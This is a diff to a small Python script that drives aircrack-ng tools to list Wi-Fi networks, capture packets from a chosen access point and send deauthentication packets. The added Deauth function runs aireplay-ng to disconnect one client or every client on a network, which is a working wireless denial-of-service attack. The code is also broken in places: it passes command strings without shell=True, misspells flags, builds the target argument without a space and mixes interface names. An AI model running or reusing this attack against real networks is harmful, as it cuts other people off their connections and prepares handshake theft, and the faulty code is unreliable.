@@ -1,19 +1,11 @@
 #!/.venv/bin/python3
-import wireless
-from wifi import Cell
-import scapy.all as scapy
 import subprocess as sub
 
 
 
 def FindNetworks():
     # using the check_output() for having the network term retrieval 
-    devices = sub.check_output(['netsh','wlan','show','network'])
-    # decode it to strings 
-    devices = devices.decode('ascii') 
-    devices= devices.replace("\r","") 
-    #return list of networks found
-    devices = devices.split("\n")
+    devices = sub.check_output("airodump-ng wlan0mon")
     
     return devices
     
@@ -37,12 +29,21 @@ def ScanAccessPoints():
 def CapturePackets(channel, bssid):
     pack = sub.check_output(f"airodump-ng -c {channel} -bssid {bssid} wlan0mon")
 
-    return pack
 
 
-def Deauth(network):
+def Deauth(network, deauthAll=False, numOfAttacks = 1, targetMac = "", accessMac = ""):
     print(f"Deauthing {network}")
-    #send deauth packet to network
+
+    if deauthAll == True:
+        #set target to all users on network
+        target = ""
+    else:
+        #syntax for command
+        target = " -c" + targetMac
+    
+    #send deauth packet to network through access point mac address
+    sub.run(f"aireplay-ng -0 {numOfAttacks} -a {accessMac}{target} ath0")
+    
 
 
 def SaveNetwork(network):
